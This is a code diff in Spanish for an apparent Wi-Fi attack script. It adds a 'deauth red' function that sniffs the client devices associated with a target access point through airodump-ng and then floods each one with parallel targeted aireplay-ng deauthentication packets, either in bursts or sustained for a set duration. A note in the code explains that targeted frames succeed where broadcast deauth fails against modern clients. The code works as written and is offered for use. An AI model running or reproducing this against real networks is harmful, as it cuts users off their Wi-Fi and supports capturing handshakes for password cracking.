@@ -85,6 +85,120 @@ def deauth(bssid, channel, count, iface, duration=0, client_mac=None):
     disable_monitor(iface)
     return output, None
 
+def _station_macs(prefix, bssid):
+    """Lee el CSV de airodump (archivos prefix*.csv) y devuelve la lista de
+    MAC de estaciones ASOCIADAS a `bssid` (seccion 'Station MAC', 6o campo =
+    BSSID). Sin duplicados, en MAYUSCULA."""
+    bssid = bssid.upper()
+    macs = []
+    for csv_path in glob.glob(prefix + "*.csv"):
+        try:
+            with open(csv_path, "r", errors="replace") as f:
+                content = f.read()
+        except Exception:
+            continue
+        idx = content.find("Station MAC")
+        if idx == -1:
+            continue
+        for line in content[idx:].splitlines()[1:]:
+            if not line.strip():
+                continue
+            parts = [p.strip() for p in line.split(",")]
+            if len(parts) < 6:
+                continue
+            if parts[5].upper() != bssid:   # solo asociados a este AP
+                continue
+            mac = parts[0].upper()
+            if mac and mac not in macs:
+                macs.append(mac)
+        break
+    return macs
+
+def deauth_network(bssid, channel, iface, duration=0, count=10, scan_seconds=8):
+    """Deauth EFECTIVO a toda la red. Los clientes modernos ignoran el deauth
+    broadcast (a ff:ff:ff:ff:ff:ff); el DIRIGIDO (-c <cliente>) si los tumba.
+    Por eso: (1) escucha unos segundos para enumerar las estaciones asociadas
+    (airodump, SOLO escucha, sin inyeccion), y (2) lanza un aireplay dirigido
+    a CADA cliente EN PARALELO durante `duration` (sostenido) o `count`
+    rafagas. Todo en UNA sola sesion de monitor. El escaneo y la inyeccion NO
+    corren a la vez (evita el problema de concurrencia airodump+aireplay, ver
+    capture_handshake). Si no detecta clientes, cae al broadcast clasico."""
+    bssid = bssid.upper()
+    ok = enable_monitor(iface)
+    if not ok:
+        return None, f"No se pudo activar modo monitor (estado real: {get_status(iface)})"
+
+    ch_result = _run(['sudo', '/usr/sbin/iw', 'dev', iface, 'set', 'channel', str(channel)])
+    if ch_result is None or ch_result.returncode != 0:
+        err_detail = (ch_result.stderr.strip() if ch_result else "sin respuesta")
+        disable_monitor(iface)
+        return None, f"No se pudo fijar canal {channel}: {err_detail}"
+    time.sleep(1)
+
+    # 1) Enumerar estaciones asociadas (solo escucha)
+    tmpdir = tempfile.mkdtemp(prefix="piscan_dn_")
+    prefix = os.path.join(tmpdir, "scan")
+    _run(['sudo', '/usr/bin/timeout', str(scan_seconds),
+          '/usr/sbin/airodump-ng', '--bssid', bssid, '-c', str(channel),
+          '-w', prefix, '--output-format', 'csv', iface],
+         timeout=scan_seconds + 5)
+    macs = _station_macs(prefix, bssid)
+    try:
+        for fpath in glob.glob(prefix + "*"):
+            os.remove(fpath)
+        os.rmdir(tmpdir)
+    except Exception:
+        pass
+
+    # 2) Deauth
+    d = int(duration) if duration else 0
+    n = 0
+    if macs:
+        if d > 0:
+            base = ['sudo', '/usr/bin/timeout', str(d), '/usr/bin/stdbuf', '-oL', '-eL',
+                    '/usr/sbin/aireplay-ng', '--deauth', '0', '-a', bssid]
+            wait_total = d + 10
+        else:
+            base = ['sudo', '/usr/bin/timeout', '20', '/usr/bin/stdbuf', '-oL', '-eL',
+                    '/usr/sbin/aireplay-ng', '--deauth', str(count), '-a', bssid]
+            wait_total = 30
+        # Un aireplay dirigido por cliente, en paralelo. Cada uno se autodetiene
+        # por su propio `timeout`, asi que solo esperamos a que terminen.
+        procs = []
+        for mac in macs:
+            try:
+                procs.append(subprocess.Popen(base + ['-c', mac, iface],
+                                              stdout=subprocess.DEVNULL,
+                                              stderr=subprocess.DEVNULL))
+            except Exception:
+                pass
+        n = len(procs)
+        deadline = time.time() + wait_total
+        for p in procs:
+            try:
+                p.wait(timeout=max(1, int(deadline - time.time())))
+            except Exception:
+                try:
+                    p.kill()
+                except Exception:
+                    pass
+    else:
+        # Fallback: broadcast clasico (mejor que nada si no vimos clientes)
+        if d > 0:
+            _run(['sudo', '/usr/bin/timeout', str(d), '/usr/bin/stdbuf', '-oL', '-eL',
+                  '/usr/sbin/aireplay-ng', '--deauth', '0', '-a', bssid, iface], timeout=d + 5)
+        else:
+            _run(['sudo', '/usr/bin/timeout', '20', '/usr/bin/stdbuf', '-oL', '-eL',
+                  '/usr/sbin/aireplay-ng', '--deauth', str(count), '-a', bssid, iface], timeout=25)
+
+    disable_monitor(iface)
+
+    if n:
+        modo = f"sostenido {d}s" if d > 0 else "rafaga"
+        return f"Deauth dirigido a {n} cliente(s), {modo}.", None
+    return ("Sin clientes asociados detectados; se envio deauth broadcast "
+            "(puede no tumbar clientes modernos).", None)
+
 def log_attack(attack_type, target_bssid, result, target_ssid=None, target_client_mac=None, details=None):
     """Guarda un ataque/prueba en wifi_attack_log. No debe bloquear el
     flujo si falla (ej. DB no disponible), por eso el try/except silencioso."""
@@ -457,12 +571,20 @@ def main():
         iface_deauth = sys.argv[5] if len(sys.argv) > 5 else 'wlan1'
         duration = int(sys.argv[6]) if len(sys.argv) > 6 else 0
         client_mac = sys.argv[7] if len(sys.argv) > 7 else None
-        output, err = deauth(bssid, channel, count, iface_deauth, duration, client_mac)
+        if client_mac and client_mac.strip():
+            # Selectivo: un cliente concreto (tap en una fila de cliente).
+            output, err = deauth(bssid, channel, count, iface_deauth, duration, client_mac)
+            atype = "deauth"
+        else:
+            # "Deauth red": dirigido a TODOS los clientes asociados (broadcast
+            # no tumba clientes modernos). Fallback a broadcast si no hay clientes.
+            output, err = deauth_network(bssid, channel, iface_deauth, duration, count)
+            atype = "deauth_red"
         if err:
-            log_attack("deauth", bssid, "fail", target_client_mac=client_mac, details=err)
+            log_attack(atype, bssid, "fail", target_client_mac=client_mac, details=err)
             print(json.dumps({"ok": False, "error": err, "mode": get_status(iface_deauth)}))
         else:
-            log_attack("deauth", bssid, "success", target_client_mac=client_mac, details=output)
+            log_attack(atype, bssid, "success", target_client_mac=client_mac, details=output)
             print(json.dumps({"ok": True, "output": output, "mode": get_status(iface_deauth)}))
     elif cmd == 'handshake':
         if len(sys.argv) < 4:
